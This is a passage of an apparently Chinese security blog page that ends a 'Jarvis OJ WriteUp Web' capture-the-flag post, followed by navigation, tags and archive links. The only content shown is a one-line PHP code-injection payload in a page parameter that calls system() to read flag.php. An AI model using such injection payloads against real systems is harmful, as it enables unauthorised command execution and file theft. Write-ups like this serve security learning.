<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;&#39;.system(cat flag.php).&#39;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/06/jarvis-oj-writeup-web/" data-id="ckpw1c6v3001xfww0hib36jb0" data-title="Jarvis OJ WriteUp Web" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/11/22/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB-jarvis-flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98writeup/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Hash长度拓展攻击——Jarvis Flag在管理员WriteUp
        
      </div>
    </a>
  
  
    <a href="/2019/11/06/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">渗透常用工具整理</div>
    </a>
  
</nav>

  
</article>


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Notes/">Notes</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUp-in-platform/">WriteUp in platform</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/uncategorized/">uncategorized</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flask/" rel="tag">Flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/" rel="tag">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" rel="tag">sql约束攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/" rel="tag">客户端session</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Flask/" style="font-size: 10px;">Flask</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/RSA/" style="font-size: 10px;">RSA</a> <a href="/tags/sqli/" style="font-size: 10px;">sqli</a> <a href="/tags/sql%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/" style="font-size: 10px;">sql约束攻击</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">反序列化</a> <a href="/tags/%E5%AE%A2%E6%88%B7%E7%AB%AFsession/" style="font-size: 10px;">客户端session</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/05/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%89%E5%85%A8%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">(no title)</a>
          </li>
        
          <li>
            <a href="/2021/05/05/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2020/11/02/%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/">关于反序列化漏洞的一点思考</a>
          </li>
        
          <li>
            <a href="/2020/05/11/ha1cyon-ctf%E5%B0%8F%E8%AE%B0/">Ha1cyon ctf小记</a>
          </li>
        
          <li>
            <a href="/2020/03/29/xxe%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">XXE任意文件读取</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>